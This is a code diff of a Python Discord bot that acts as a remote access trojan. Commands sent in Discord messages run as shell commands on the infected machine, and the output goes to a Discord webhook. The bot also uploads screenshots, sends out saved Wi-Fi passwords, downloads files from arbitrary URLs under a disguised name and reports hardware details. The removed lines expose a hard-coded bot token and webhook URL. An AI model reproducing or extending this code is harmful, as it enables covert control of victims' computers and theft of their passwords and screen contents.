@@ -1,13 +1,19 @@
 import os
+import time
 import subprocess
-import discord
-from discord_webhook import DiscordWebhook
 import pyautogui
 import datetime
-import time
+import discord
+from discord_webhook import DiscordWebhook
+import wmi
+import requests
+
+from dotenv import load_dotenv
+load_dotenv()
 
 
-TOKEN = "MTE5NTMzMTE1NzEwNjEwMjMzNA.G9IMv5.gaZq6AofRr_kZOgtv5GojC5HnFA3niGjFaM4s0"
+
+TOKEN = os.getenv("BOT_TOKEN")
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -29,13 +35,32 @@ async def on_message(message):
         command = message.content
         command = command.replace('command ', '')
         # os.system(command)
-        hmm = subprocess.check_output(command,stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8')
-        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content=hmm)
-        response = webhook.execute()
-        out = hmm
+        hmm = subprocess.run(command, capture_output=True, text=True)
+        out = hmm.stdout
         out = out.replace('Ã', '├')
         out = out.replace('Ä', '─')
         print(out)
+        #webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content=out)
+        #response = webhook.execute()
+        
+        
+        chunklength = 2000
+        chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]
+        for chunk in chunks: 
+            webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content=chunk)
+            response = webhook.execute()
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+       
     
     elif message.content.startswith('com'):
         await message.channel.send('Sent command!')
@@ -51,7 +76,7 @@ async def on_message(message):
         time_now = datetime.datetime.now()
         myScreenshot = pyautogui.screenshot()
         myScreenshot.save("help.png")
-        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content="Screenshot taken at " + str(time_now))
+        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="Screenshot taken at " + str(time_now))
         with open("./help.png", "rb") as f:
             webhook.add_file(file=f.read(), filename="help.png")
         response = webhook.execute()
@@ -94,16 +119,31 @@ async def on_message(message):
         out += f'{"-"*20}|{"-"*29}\n'
         for name, password in networks:
             out += '{:<20}| {:<}\n'.format(name, password)
-        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content="`"+ out + "`")
+        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="`"+ out + "`")
         response = webhook.execute()
 
 
         
-        
-        
-        
-        
+    elif message.content.startswith('download'):
+        command = message.content
+        command = command.replace('download ', '')
+        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="Downloading!")
+        response = webhook.execute()
+    
+        url = command
+        r = requests.get(url, allow_redirects=True)
+        open('facebook.ico', 'wb').write(r.content)
         
 
+    elif message.content.startswith('sys'):
+            command = message.content
+            command = command.replace('sys ', '')
+            cpu = wmi.WMI().Win32_Processor()[0].Name
+            gpu = wmi.WMI().Win32_VideoController()[0].Name
+            ram = round(float(wmi.WMI().Win32_OperatingSystem()[
+                        0].TotalVisibleMemorySize) / 1048576, 0)
+            webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
+            response = webhook.execute()
+        
 
 client.run(TOKEN)
